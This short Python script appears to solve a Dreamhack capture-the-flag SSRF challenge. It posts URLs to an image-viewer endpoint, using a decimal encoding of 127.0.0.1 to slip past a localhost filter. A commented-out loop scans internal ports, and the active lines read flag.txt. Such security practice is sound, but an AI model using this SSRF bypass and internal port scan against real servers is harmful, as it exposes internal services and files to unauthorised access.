import requests

# for port in range(1500,1800):
#     url = f"http://2130706433:{port}"
#     data = {"url":url}
    
#     resp = requests.post("http://host3.dreamhack.games:23726/img_viewer", data=data)
#     if "iVBORw0KGgoAAAA" in resp.text:continue
#     print(resp.text)
#     print(port)

data = {"url":"http://2130706433:1533/flag.txt"}
resp = requests.post("http://host3.dreamhack.games:23726/img_viewer", data=data)
print(resp.text)